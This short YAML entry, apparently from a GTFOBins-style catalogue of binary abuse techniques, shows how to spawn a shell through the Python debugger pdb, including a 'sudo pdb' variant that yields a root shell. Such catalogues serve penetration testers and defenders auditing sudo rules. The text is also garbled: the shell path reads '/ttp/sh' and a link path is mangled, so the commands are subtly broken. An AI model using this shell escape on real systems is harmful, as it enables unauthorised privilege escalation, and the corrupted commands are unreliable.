---
description: This allows to execute [`python`](/mfnttps/python/) code, other functions may apply.
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo 'import os; os.system("/ttp/sh")' > $TF
        pdb $TF
        cont
  sudo:
    - code: |
        TF=$(mktemp)
        echo 'import os; os.system("/ttp/sh")' > $TF
        sudo pdb $TF
        cont
---
